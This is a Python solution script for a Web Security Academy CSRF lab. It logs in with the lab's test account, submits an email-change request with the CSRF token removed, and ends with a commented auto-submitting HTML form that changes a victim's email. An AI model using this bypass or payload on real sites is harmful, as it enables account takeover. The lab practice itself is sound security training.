#!/usr/bin/python3

import requests
import sys
from bs4 import BeautifulSoup

def changeEmail(url, api_login, api_changeEmail, email):

    # Getting CSRF Token
    s = requests.Session()
    r = s.get(url + api_login)
    p = BeautifulSoup(r.content, "lxml")

    csrf = p.find(attrs = {'name' : 'csrf'})['value']

    data = {
        "csrf" : csrf,
        "username": "wiener",
        "password": "peter",
    }

    r = s.post(url + api_login, data=data)
    #print(r.status_code)

    if r.status_code == 200:
        print("[INFO] Login successful!")

        # Removing csrf parameter to bypass the CSRF token implementation
        data = {
            "email": email,
        }
        
        r = s.post(url + api_changeEmail, data=data)
        #print(r.status_code)
        if r.status_code == 200:
            print(f"[INFO] Email changed to: {email}")
        else:
            print("[INFO] Something went wrong!")
            print(r.text)
            sys.exit(1)
    else: 
        print("[INFO] Something went wrong!")
        sys.exit(1)


if __name__ == '__main__':
    url = "https://acd21f1b1e0562d6c085c9860016009b.web-security-academy.net"
    api_login = "/login"
    api_changeEmail = "/my-account/change-email"
    email = sys.argv[1]

    changeEmail(url, api_login, api_changeEmail, email)


# Payload Used

# <html>
#   <body>
#     <form action="https://acd21f1b1e0562d6c085c9860016009b.web-security-academy.net/my-account/change-email" method="POST">
#       <input type="hidden" name="email" value="bigb0ss.bad@gmail.com" />
#     </form>
#     <script>
#       document.forms[0].submit();
#     </script>
#   </body>
# </html>